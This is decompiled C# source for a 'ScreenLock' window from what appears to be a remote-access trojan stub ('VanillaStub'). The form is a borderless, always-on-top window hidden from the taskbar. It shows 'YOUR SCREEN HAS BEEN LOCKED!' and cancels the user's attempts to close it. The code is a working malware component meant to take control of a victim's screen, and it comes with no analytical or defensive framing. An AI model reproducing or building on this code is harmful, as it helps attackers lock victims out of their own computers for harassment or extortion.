using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace VanillaStub.Forms;

public class ScreenLock : IScreenLocker
{
	private IContainer components = null;

	private Label lblTitle;

	public ScreenLock()
	{
		InitializeComponent();
	}

	private void OnClose(object sender, FormClosingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)e.get_CloseReason() == 3)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Expected O, but got Unknown
		//IL_014f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Expected O, but got Unknown
		lblTitle = new Label();
		((Control)this).SuspendLayout();
		((Control)lblTitle).set_Anchor((AnchorStyles)0);
		((Control)lblTitle).set_AutoSize(true);
		((Control)lblTitle).set_Font(new Font("Trebuchet MS", 26.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblTitle).set_ForeColor(Color.FromArgb(223, 230, 233));
		((Control)lblTitle).set_Location(new Point(117, 150));
		((Control)lblTitle).set_Name("lblTitle");
		((Control)lblTitle).set_Size(new Size(567, 43));
		((Control)lblTitle).set_TabIndex(0);
		((Control)lblTitle).set_Text("YOUR SCREEN HAS BEEN LOCKED!");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(45, 52, 54));
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).get_Controls().Add((Control)(object)lblTitle);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("ScreenLock");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(OnClose));
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
